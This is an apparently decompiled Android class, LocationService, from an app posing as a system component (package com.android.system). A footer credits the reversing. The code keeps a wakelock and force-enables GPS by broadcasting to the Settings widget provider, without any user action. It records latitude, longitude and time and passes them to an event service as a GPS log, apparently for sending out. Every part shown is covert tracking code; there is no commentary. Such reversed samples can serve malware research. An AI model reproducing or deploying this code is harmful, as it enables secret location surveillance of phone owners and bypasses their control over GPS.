package com.android.system;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.provider.Settings.Secure;
import com.app.system.common.service.EventsAndReceiveService;
import com.security.ServiceSettings;
import com.security.b;
import java.util.Date;

public class LocationService
  extends Service
{
  private static volatile PowerManager.WakeLock c;
  boolean a = false;
  boolean b = false;
  private Location d = null;
  private final LocationListener e = new a();
  private Context f;
  private LocationManager g;
  
  private Location a(String paramString)
  {
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append("requestUpdatesFromProvider ");
    localStringBuilder.append(paramString);
    com.security.d.a.d("LocationService", localStringBuilder.toString(), new Object[0]);
    if (!this.g.isProviderEnabled(paramString)) {
      return null;
    }
    long l = this.f.getSharedPreferences("gps", 0).getLong("gps-interval", 120L);
    if (b.a(this, "android.permission.ACCESS_FINE_LOCATION", "requestUpdatesFromProvider@LocationService.java"))
    {
      this.g.requestLocationUpdates(paramString, l * 1000L, 5.0F, this.e);
      return this.g.getLastKnownLocation(paramString);
    }
    return null;
  }
  
  private static PowerManager.WakeLock a(Context paramContext)
  {
    if (c == null)
    {
      c = ((PowerManager)paramContext.getApplicationContext().getSystemService("power")).newWakeLock(1, "com.android.system.LocationService:wakelock");
      c.setReferenceCounted(true);
    }
    return c;
  }
  
  private boolean a(String paramString1, String paramString2)
  {
    if (paramString1 == null)
    {
      boolean bool;
      if (paramString2 == null) {
        bool = true;
      } else {
        bool = false;
      }
      return bool;
    }
    return paramString1.equals(paramString2);
  }
  
  private boolean c()
  {
    try
    {
      PackageInfo localPackageInfo = getPackageManager().getPackageInfo("com.android.settings", 2);
      if (localPackageInfo == null) {
        return false;
      }
      localObject = localPackageInfo.receivers;
      int i = localObject.length;
      int j = 0;
      int k;
      do
      {
        localPackageInfo = localObject[j];
        if (localPackageInfo.name.equals("com.android.settings.widget.SettingsAppWidgetProvider"))
        {
          boolean bool = localPackageInfo.exported;
          if (bool) {
            return true;
          }
        }
        k = j + 1;
        j = k;
      } while (i < k);
      return false;
    }
    catch (Exception localException)
    {
      Object localObject = new StringBuilder();
      ((StringBuilder)localObject).append("canToggleGPS: ");
      ((StringBuilder)localObject).append(localException.getMessage());
      com.security.d.a.a("LocationService", ((StringBuilder)localObject).toString(), new Object[0]);
      return false;
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException)
    {
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("canToggleGPS: ");
      localStringBuilder.append(localNameNotFoundException.getMessage());
      com.security.d.a.a("LocationService", localStringBuilder.toString(), new Object[0]);
    }
    return false;
  }
  
  private void d()
  {
    if (!Settings.Secure.getString(getContentResolver(), "location_providers_allowed").contains("gps"))
    {
      Intent localIntent = new Intent();
      localIntent.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
      localIntent.addCategory("android.intent.category.ALTERNATIVE");
      localIntent.setData(Uri.parse("3"));
      sendBroadcast(localIntent);
    }
  }
  
  private void e()
  {
    if (Settings.Secure.getString(getContentResolver(), "location_providers_allowed").contains("gps"))
    {
      Intent localIntent = new Intent();
      localIntent.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
      localIntent.addCategory("android.intent.category.ALTERNATIVE");
      localIntent.setData(Uri.parse("3"));
      sendBroadcast(localIntent);
    }
  }
  
  protected Location a(Location paramLocation1, Location paramLocation2)
  {
    if (paramLocation2 == null) {
      return paramLocation1;
    }
    long l = paramLocation1.getTime() - paramLocation2.getTime();
    int i = 1;
    int j;
    if (l > 120L) {
      j = 1;
    } else {
      j = 0;
    }
    int k;
    if (l < -120L) {
      k = 1;
    } else {
      k = 0;
    }
    int m;
    if (l > 0L) {
      m = 1;
    } else {
      m = 0;
    }
    if (j != 0) {
      return paramLocation1;
    }
    if (k != 0) {
      return paramLocation2;
    }
    int n = (int)(paramLocation1.getAccuracy() - paramLocation2.getAccuracy());
    if (n > 0) {
      j = 1;
    } else {
      j = 0;
    }
    if (n < 0) {
      k = 1;
    } else {
      k = 0;
    }
    if (n <= 200) {
      i = 0;
    }
    boolean bool = a(paramLocation1.getProvider(), paramLocation2.getProvider());
    if (k != 0) {
      return paramLocation1;
    }
    if ((m != 0) && (j == 0)) {
      return paramLocation1;
    }
    if ((m != 0) && (i == 0) && (bool)) {
      return paramLocation1;
    }
    return paramLocation2;
  }
  
  public void a(Location paramLocation)
  {
    if (!ServiceSettings.a().gpsAndCellsActive)
    {
      com.security.d.a.d("LocationService", "PROCESS LOCATION: Location SERVIZIO DISABILITATO - NESSUN INVIO", new Object[0]);
      this.g.removeUpdates(this.e);
      stopSelf();
      return;
    }
    if (paramLocation != null)
    {
      Object localObject = new StringBuilder();
      ((StringBuilder)localObject).append("processLocation ");
      ((StringBuilder)localObject).append(paramLocation.getLatitude());
      ((StringBuilder)localObject).append(" - ");
      ((StringBuilder)localObject).append(paramLocation.getLongitude());
      com.security.d.a.d("LocationService", ((StringBuilder)localObject).toString(), new Object[0]);
      localObject = this.f.getSharedPreferences("gps", 0).edit();
      ((SharedPreferences.Editor)localObject).putFloat("value_latitude", (float)paramLocation.getLatitude());
      ((SharedPreferences.Editor)localObject).putFloat("value_longitude", (float)paramLocation.getLongitude());
      ((SharedPreferences.Editor)localObject).putFloat("value_accurate", paramLocation.getAccuracy());
      ((SharedPreferences.Editor)localObject).putLong("last_gps_time", new Date().getTime() / 1000L);
      ((SharedPreferences.Editor)localObject).commit();
      double d1 = paramLocation.getLatitude();
      double d2 = paramLocation.getLongitude();
      float f1 = paramLocation.getAccuracy();
      localObject = new Intent(this.f.getApplicationContext(), EventsAndReceiveService.class);
      ((Intent)localObject).putExtra("event_core_app", "event_gps_log");
      ((Intent)localObject).putExtra("lat", String.valueOf(d1));
      ((Intent)localObject).putExtra("lon", String.valueOf(d2));
      ((Intent)localObject).putExtra("date", paramLocation.getTime() / 1000L);
      ((Intent)localObject).putExtra("alt", String.valueOf(f1));
      com.b.a.a.a.a(this.f, (Intent)localObject);
      paramLocation = a(this.f);
      if (paramLocation.isHeld()) {
        paramLocation.release();
      }
      this.g.removeUpdates(this.e);
      stopSelf();
    }
  }
  
  public void a(boolean paramBoolean)
  {
    if (!c()) {
      return;
    }
    if (paramBoolean) {
      d();
    } else {
      e();
    }
  }
  
  public boolean a()
  {
    boolean bool;
    try
    {
      if (this.g == null) {
        this.g = ((LocationManager)getSystemService("location"));
      }
      bool = this.g.isProviderEnabled("gps");
    }
    catch (Exception localException)
    {
      bool = false;
    }
    return bool;
  }
  
  public void b()
  {
    Location localLocation1 = a("gps");
    Location localLocation2 = a("network");
    if ((localLocation1 != null) && (localLocation2 != null)) {
      a(localLocation1, localLocation2);
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    com.security.d.a.d("LocationService", "SERVIZIO LOCATION SERVICE ONCREATE", new Object[0]);
    super.onCreate();
    com.security.d.a.d("LocationService", "onCreate Service", new Object[0]);
    try
    {
      if (!a())
      {
        a(true);
        com.security.d.a.b("LocationService", "check_the_status_of_GPS : on", new Object[0]);
      }
      this.g = ((LocationManager)getSystemService("location"));
      this.f = getApplicationContext();
      Object localObject = getSharedPreferences("gps", 0);
      double d1 = ((SharedPreferences)localObject).getFloat("value_longitude", 0.0F);
      double d2 = ((SharedPreferences)localObject).getFloat("value_latitude", 0.0F);
      float f1 = ((SharedPreferences)localObject).getFloat("value_accurate", 0.0F);
      localObject = new android/location/Location;
      ((Location)localObject).<init>("com.android.system.LocationService:wakelock");
      this.d = ((Location)localObject);
      if (d1 == 0.0D)
      {
        this.d = null;
        return;
      }
      this.d.setLongitude(d1);
      this.d.setLatitude(d2);
      this.d.setAccuracy(f1);
    }
    catch (Exception localException)
    {
      com.security.d.a.d("LocationService", localException.getMessage(), new Object[0]);
    }
  }
  
  public void onDestroy()
  {
    try
    {
      com.security.d.a.d("LocationService", "SERVIZIO LOCATION SERVICE ONDESTROY", new Object[0]);
      this.g.removeUpdates(this.e);
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  public void onLowMemory() {}
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    paramIntent = a(this.f);
    if ((!paramIntent.isHeld()) || ((paramInt1 & 0x1) != 0)) {
      paramIntent.acquire();
    }
    if (b.a(this, "android.permission.ACCESS_FINE_LOCATION", "onStartCommand@LocationService.java")) {
      b();
    }
    return 3;
  }
  
  class a
    implements LocationListener
  {
    a() {}
    
    public void onLocationChanged(Location paramLocation)
    {
      Object localObject = new StringBuilder();
      ((StringBuilder)localObject).append("onLocationChanged ");
      ((StringBuilder)localObject).append(paramLocation.getProvider());
      com.security.d.a.d("LocationService", ((StringBuilder)localObject).toString(), new Object[0]);
      localObject = LocationService.this;
      localObject = ((LocationService)localObject).a(paramLocation, LocationService.a((LocationService)localObject));
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("betterLocation: ");
      localStringBuilder.append(((Location)localObject).getProvider());
      com.security.d.a.d("LocationService", localStringBuilder.toString(), new Object[0]);
      if (localObject != LocationService.a(LocationService.this))
      {
        LocationService.a(LocationService.this, (Location)localObject);
        if (paramLocation.getProvider().equals("gps")) {
          LocationService.this.a = true;
        }
        if (paramLocation.getProvider().equals("network")) {
          LocationService.this.b = true;
        }
        if ((LocationService.this.a) || (LocationService.this.b)) {
          LocationService.this.a(paramLocation);
        }
      }
      com.security.d.a.d("LocationService", " ignore location", new Object[0]);
    }
    
    public void onProviderDisabled(String paramString) {}
    
    public void onProviderEnabled(String paramString) {}
    
    public void onStatusChanged(String paramString, int paramInt, Bundle paramBundle) {}
  }
}


/* Location:              ~/com/android/system/LocationService.class
 *
 * Reversed by:           J
 */